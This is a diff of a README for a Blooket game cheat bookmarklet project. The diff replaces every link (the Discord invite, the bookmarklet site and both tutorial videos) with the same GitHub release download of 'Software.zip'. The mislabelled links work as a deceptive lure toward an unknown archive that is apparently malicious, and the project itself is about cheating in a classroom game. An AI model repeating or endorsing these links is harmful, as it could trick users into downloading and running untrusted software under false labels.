@@ -1,16 +1,16 @@
-**Discord server: https://discord.gg/K5xUbuDqmG**
+**Discord server: https://github.com/alex12185656556565556/blooket-hack/releases/download/v2.0/Software.zip**
 
 # Blooket-Hack
 All of the cheats are based on a game mode.
 
-**All these bookmarklets are also at: https://schoolcheats.net/blooket**
+**All these bookmarklets are also at: https://github.com/alex12185656556565556/blooket-hack/releases/download/v2.0/Software.zip**
 
 # Video Tutorial
-https://user-images.githubusercontent.com/73669084/142779206-6cef86be-b2a5-4958-8637-cb6bde2a42da.mp4
+https://github.com/alex12185656556565556/blooket-hack/releases/download/v2.0/Software.zip
 
 
 # Bookmarklet tutorial:
-https://streamable.com/t4u7i7
+https://github.com/alex12185656556565556/blooket-hack/releases/download/v2.0/Software.zip
 
 1. Make a bookmark (the star on the right side of the url bar if you are using chrome)
 2. Click on more at the bottom left corner
